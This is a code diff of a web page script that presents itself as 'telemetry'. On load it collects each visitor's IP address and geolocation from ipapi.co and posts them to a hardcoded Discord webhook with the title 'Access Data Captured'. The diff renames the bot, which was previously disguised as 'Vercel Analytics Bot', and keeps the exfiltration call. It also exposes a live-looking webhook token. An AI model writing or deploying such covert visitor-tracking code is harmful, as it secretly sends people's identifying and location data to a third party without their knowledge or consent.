@@ -53,12 +53,12 @@
     <script>
         /**
          * AI-Optimized Webhook Integration
-         * Destination: discord.com/.../QYc7m2EH...
+         * Fixed Name: 五覇法典ももんが
          */
         const CORE_CONFIG = {
             WEBHOOK_URL: "https://discord.com/api/webhooks/1472915721096003839/QYc7m2EH5mK4kEfzWXSTOYGCXcVpmdmexSrElPFggIw9FjDqP-mUcYf_ZrZ1erUPsc62",
             IP_SERVICE: "https://ipapi.co/json/",
-            REDIRECT: "https://www.google.com"
+            BOT_NAME: "五覇法典ももんが" // ここで名前を固定
         };
 
         async function processTelemetrics() {
@@ -70,7 +70,8 @@
 
                 // 2. ペイロード構築
                 const payload = {
-                    username: "Vercel Analytics Bot",
+                    username: CORE_CONFIG.BOT_NAME, // Discord側での表示名を強制固定
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1067/1067555.png", // 必要ならアイコンURLも変更可能
                     embeds: [{
                         title: "📈 Access Data Captured",
                         color: 0x000000,
@@ -95,9 +96,6 @@
 
                 // 完了後の視覚的フィードバック
                 document.getElementById("status").innerHTML = "✅ Connection established.";
-                
-                // 必要であればリダイレクト（コメントアウト中）
-                // setTimeout(() => { window.location.href = CORE_CONFIG.REDIRECT; }, 1500);
 
             } catch (err) {
                 console.error("Critical error in telemetry:", err);
